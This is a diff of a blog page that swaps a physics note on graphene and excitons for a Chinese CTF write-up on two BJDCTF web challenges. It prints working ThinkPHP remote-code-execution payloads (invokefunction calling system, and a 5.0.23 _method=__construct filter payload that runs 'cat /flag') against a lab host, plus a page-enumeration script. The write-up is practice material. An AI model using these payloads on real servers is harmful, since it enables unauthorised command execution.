@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>论文的一点记录 · DGZ&#39;s Blog</title>
+    <title>BJDCTF WP - WEB-1 · DGZ&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >DGZ&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">论文的一点记录</a>
+                <a href="#" class="post-name">BJDCTF WP - WEB-1</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            论文的一点记录
+            BJDCTF WP - WEB-1
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "待定">待定</a>
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "web">web</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.6k</span>Reading time: <span class="post-count reading-time">5 min</span></span>
+                        <span>Word count: <span class="post-count word-count">701</span>Reading time: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/03/11</span>
+                    <span class="post-intro-time">2020/03/29</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,29 +401,31 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="二维材料"><a href="#二维材料" class="headerlink" title="二维材料"></a>二维材料</h2><p>石墨烯的光子和光电子学属性可以归纳为：</p>
-<blockquote>
-<p>1）<strong>圆锥形能带</strong>结构使石墨烯对紫外——可见——红外区域任何频率的光子都具有共振的光学响应<br>2）单层石墨烯对任何波长的低强度光波都具有严格的~2.3%的吸收率<br>3）石墨烯具有超快的载流子弛豫动力学过程，其能带内热平衡弛豫时间约100fs，带间跃迁弛豫时间约几个皮秒<br>4）石墨烯具有优秀的非线性光学性质，在不同条件下，石墨烯材料拥有显著的非线性散射、双光子吸收、激发态吸收和饱和吸收性能，也可产生二次谐波<br>5）氧化石墨烯中$sp^2和sp^3$杂化碳原子混合结构产生的有线宽度带隙使其具有优良的可调谐光学性质。</p>
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>总的来说就是我弱爆了</p>
+<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><blockquote>
+<p>dir溢出？不知道什么蛇皮</p>
 </blockquote>
-<p>二维单分子层TMDC(过渡金属硫族化合物)纳米材料应用于高灵敏光电器件上的优势更加显著:</p>
+<p>但其实关键的不是标题，而是body里面的php<br><img src="https://s1.ax1x.com/2020/03/29/GVN6EQ.png" alt="GVN6EQ.png"></p>
+<p>参考：<a href="https://www.gem-love.com/ctf/2097.html#i-5" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html#i-5</a><br><a href="https://www.cnblogs.com/h3zh1/p/12549645.html" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/p/12549645.html</a><br>直接上exp，报错了，利用报错可以收集一些信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eac4f212-547a-4fa5-9cc2-f02490ae4116.node3.buuoj.cn/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure><br><a href="https://imgchr.com/i/GVdb5Q" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/29/GVdb5Q.png" alt="GVdb5Q.png"></a><br>之后找5.0.23的RCE<br>POST:<code>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag</code></p>
+<p>另外有一道php RCE的题：<a href="https://www.cnblogs.com/Cl0ud/p/12589768.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12589768.html</a></p>
+<h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p><img src="https://s1.ax1x.com/2020/03/26/GSnAgg.png" alt="GSnAgg.png"></p>
 <blockquote>
-<p>1）大比表面积和小尺寸使得其较体材料具有更高的灵敏度，同时由于更多表面态的存在，光生载流子的寿命得到延长<br>2）TMDC半导体带隙在很大程度上依赖于其单层数量，这种高敏度层数依赖效应可以实现单一TMDC材料的共振响应光谱的连续可调谐。<br>3）大面积单分子层结构有效降低了器件设计复杂性和制造成本，可大大提高器件集成度，降低器件尺寸及能耗<br>4）二维分子层良好的力学性能有望实现可任意弯折的器件表面。</p>
+<p>一张图，保存到本地了，</p>
 </blockquote>
-<h2 id="激子"><a href="#激子" class="headerlink" title="激子"></a>激子</h2><p>在半导体中，如果一个电子从满的价带激发到空的导带上去，则在价带内产生一个空穴，而在导带内产生一个电子，从而形成一个电子-空穴对。空穴带正电，电子带负电，它们受<strong>库仑力</strong>而互相吸引，在一定的条件下会使它们在空间上束缚在一起，这样形成的复合体称为激子。激子作为一种准粒子，寿命很短，最终会消失。</p>
-<p>在光跃迁过程中，被激发到导带中的电子和在价带中的空穴由于库仑相互作用，将形成一个束缚态，称为激子。激子提供了能量平衡，使得激子体系的总能量略小于未束缚的电子和空穴的能量。<br>万尼尔（Wannier）激子：电子和空穴分布在较大的空间范围，库仑束缚较弱，电子“感受”到的是平均晶格势与空穴的库仑静电势，这种激子主要是半导体中；<br>弗伦克尔（Frenkel）激子：电子和空穴束缚在体元胞范围内，库仑作用较强，这种激子主要是在绝缘体中。</p>
-<p>激子是固体中的一种基本的元激发,是由库仑互作用互相束缚着的电子-空穴对。半导体吸收一个光子之后，电子由价带跃迁至导带，但是电子由于库仑作用仍然和价带中 的空穴联系在一起。<br>激子对描述半导体的光学特性有重要意义；自由激子束缚在杂质上形成束缚激子。激子束缚能大，说明自由激子容易和杂质结合形成发光中心。激子效应对半导体中的光吸收、发光、激射和光学非线性作用等物理过程具有重要影响,并在半导体光电子器件的研究和开发中得到了重要的应用.与半导体体材料相比,在量子化的低维电子结构中,激子的束缚能要大得多,激子效应增强,而且在较高温度或在电场作用下更稳定。</p>
-<p>在半导体吸收光谱中，本征的带间吸收过程是指半导体吸收一个光子后，在导带和价带同时产生一对自由的电子和空穴.但实际上除了在吸收带边以上产生连续谱吸收区以外，还可以观测到存在着分立的吸收谱线，这些谱线是由激子吸收引起的，其能谱结构与氢原子的吸收谱线非常类似.激子谱线的产生是由于当固体吸收光子时，电子虽已从价带激发到导带，但仍因库仑作用而和价带中留下的空穴联系在一起，形成了激子态.自由激子作为一个整体可以在半导体中运动.这种因静电库仑作用而束缚在一起的电子空穴对是一种电中性的、非导电性的电子激发态.<br>与氢原子一样，激子也具有相应的基态和激发态，但其能量状态与固体中的介电效应和电子空穴的有效质量有关.实际上，固体中的激子态可用类氢模型加以描述，并按此模型很好地估算出激子在带边下分立能级的能态和电离能。<br>总的来说，宽禁带的半导体材料，激子束缚能较大，而激子玻尔半径则比较小.而禁带较窄的材料，其激子电离能较小，激子玻尔半径则较大。</p>
-<p>对于自由激子,激子激活能=激子束缚能（exciton binding energy）=激子电离能   </p>
-<p>激子的波尔半径简言之就是激子在半导体中一个能自由运动的区域的半径。平均自由程是指激子在运动时的一个空间尺度。形象的说，比如在某半导体里激子的自由程是1nm，那这个激子在做无序运动时“跳一下”平均能跳出1nm远。但是如果你的半导体的尺寸比激子的波尔半径还小，激子的活动空间本来就没那么大，跳一下就跳不出1nm了。这称之为“量子限域效应”。在这个很小的尺度内，激子密度很大，很拥挤。能带也随之发生变化。这种现象一般见于非常小尺度的半导体中，如半导体量子点、量子阱等等中。</p>
+<p>纯脑洞题啊<br><a href="https://imgchr.com/i/GSM18f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/26/GSM18f.png" alt="GSM18f.png"></a><br>有十六进制字符串，转换成文本就是Po.php<br>进入该页面看到一个点<br>这样的提示都不知道是遍历元素的php页面…<br>我就是那个懒得写脚本+找不到元素周期表字典的人了！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests as req</span><br><span class="line">elements = (&apos;H&apos;, &apos;He&apos;, &apos;Li&apos;, &apos;Be&apos;, &apos;B&apos;, &apos;C&apos;, &apos;N&apos;, &apos;O&apos;, &apos;F&apos;, &apos;Ne&apos;, &apos;Na&apos;, &apos;Mg&apos;, &apos;Al&apos;, &apos;Si&apos;, &apos;P&apos;, &apos;S&apos;, &apos;Cl&apos;, &apos;Ar&apos;, &apos;K&apos;, &apos;Ca&apos;, &apos;Sc&apos;, &apos;Ti&apos;, &apos;V&apos;, &apos;Cr&apos;, &apos;Mn&apos;, &apos;Fe&apos;, &apos;Co&apos;, &apos;Ni&apos;, &apos;Cu&apos;, &apos;Zn&apos;, &apos;Ga&apos;, &apos;Ge&apos;, &apos;As&apos;, &apos;Se&apos;, &apos;Br&apos;, &apos;Kr&apos;, &apos;Rb&apos;, &apos;Sr&apos;, &apos;Y&apos;, &apos;Zr&apos;, &apos;Nb&apos;, &apos;Mo&apos;, &apos;Te&apos;, &apos;Ru&apos;, &apos;Rh&apos;, &apos;Pd&apos;, &apos;Ag&apos;, &apos;Cd&apos;, &apos;In&apos;, &apos;Sn&apos;, &apos;Sb&apos;, &apos;Te&apos;, &apos;I&apos;, &apos;Xe&apos;, &apos;Cs&apos;, &apos;Ba&apos;, &apos;La&apos;, &apos;Ce&apos;, &apos;Pr&apos;, &apos;Nd&apos;, &apos;Pm&apos;, &apos;Sm&apos;, &apos;Eu&apos;, &apos;Gd&apos;, &apos;Tb&apos;, &apos;Dy&apos;, &apos;Ho&apos;, &apos;Er&apos;, &apos;Tm&apos;, &apos;Yb&apos;, &apos;Lu&apos;, &apos;Hf&apos;, &apos;Ta&apos;, &apos;W&apos;, &apos;Re&apos;, &apos;Os&apos;, &apos;Ir&apos;, &apos;Pt&apos;, &apos;Au&apos;, &apos;Hg&apos;, &apos;Tl&apos;, &apos;Pb&apos;, &apos;Bi&apos;, &apos;Po&apos;, &apos;At&apos;, &apos;Rn&apos;, &apos;Fr&apos;, &apos;Ra&apos;, &apos;Ac&apos;, &apos;Th&apos;, &apos;Pa&apos;, &apos;U&apos;, &apos;Np&apos;, &apos;Pu&apos;, &apos;Am&apos;, &apos;Cm&apos;, &apos;Bk&apos;, &apos;Cf&apos;, &apos;Es&apos;, &apos;Fm&apos;,&apos;Md&apos;, &apos;No&apos;, &apos;Lr&apos;,&apos;Rf&apos;, &apos;Db&apos;, &apos;Sg&apos;, &apos;Bh&apos;, &apos;Hs&apos;, &apos;Mt&apos;, &apos;Ds&apos;, &apos;Rg&apos;, &apos;Cn&apos;, &apos;Nh&apos;, &apos;Fl&apos;, &apos;Mc&apos;, &apos;Lv&apos;, &apos;Ts&apos;, &apos;Og&apos;, &apos;Uue&apos;)</span><br><span class="line">for symbol in elements:</span><br><span class="line">    link = &quot;http://667095ac-1c37-4288-a50b-4e178d0b6df6.node3.buuoj.cn/&quot; + symbol + &quot;.php&quot;</span><br><span class="line">    response = req.get(link)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        print(response.text, end=&apos;&apos;)</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line">#And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php[Finished in 12.5s]</span><br></pre></td></tr></table></figure><br>若print(response.text)，输出结果就不是连在一起的，</p>
+<blockquote>
+<p>end=’’作用：为末尾end传递一个空字符串，这样print函数不会在字符串末尾添加一个换行符，而是添加一个空字符串，表示这个语句没结束。</p>
+</blockquote>
+<p>进入这个php页面就看到flag了</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>Author：<a href="https://dgz-cyber.github.io">DGZ</a>
-            <p>原文链接：<a href="https://dgz-cyber.github.io/2020/03/11/%E8%AE%BA%E6%96%87%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/">https://dgz-cyber.github.io/2020/03/11/%E8%AE%BA%E6%96%87%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/</a>
-            <p>发表日期：<a href="https://dgz-cyber.github.io/2020/03/11/%E8%AE%BA%E6%96%87%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/">March 11th 2020, 12:30:40 am</a>
-            <p>更新日期：<a href="https://dgz-cyber.github.io/2020/03/11/%E8%AE%BA%E6%96%87%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/">March 11th 2020, 12:57:02 am</a>
+            <p>原文链接：<a href="https://dgz-cyber.github.io/2020/03/29/BJDCTF%20WP%20-%20WEB-1/">https://dgz-cyber.github.io/2020/03/29/BJDCTF%20WP%20-%20WEB-1/</a>
+            <p>发表日期：<a href="https://dgz-cyber.github.io/2020/03/29/BJDCTF%20WP%20-%20WEB-1/">March 29th 2020, 10:07:56 pm</a>
+            <p>更新日期：<a href="https://dgz-cyber.github.io/2020/03/29/BJDCTF%20WP%20-%20WEB-1/">March 29th 2020, 10:21:29 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -431,17 +433,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/03/19/%E7%83%A4%E9%B8%A1%E7%BF%85%EF%BC%88%E6%A0%B9%EF%BC%89%E5%8F%8A%E7%83%A4%E8%9B%8B%E6%8C%9E%E6%B6%B2%E8%AE%B0%E5%BD%95/" title= "烤鸡翅（根）及烤蛋挞液记录">
-                    <div class="nextTitle">烤鸡翅（根）及烤蛋挞液记录</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/03/11/%E7%83%A4%E7%AE%B1%E8%9B%8B%E7%B3%95%E8%AE%B0%E5%BD%95/" title= "烤箱蛋糕记录">
-                    <div class="prevTitle">烤箱蛋糕记录</div>
+                <a href= "/2020/03/24/BJDCTF%20WP%20-%20MISC%E3%80%81CRYPTO%E3%80%81RE/" title= "BJDCTF WP - MISC、CRYPTO、RE">
+                    <div class="prevTitle">BJDCTF WP - MISC、CRYPTO、RE</div>
                 </a>
             
         </li>
@@ -560,7 +557,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#二维材料"><span class="toc-number">1.</span> <span class="toc-text">二维材料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#激子"><span class="toc-number">2.</span> <span class="toc-text">激子</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#old-hack"><span class="toc-number">1.1.</span> <span class="toc-text">old-hack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#elementmaster"><span class="toc-number">1.2.</span> <span class="toc-text">elementmaster</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
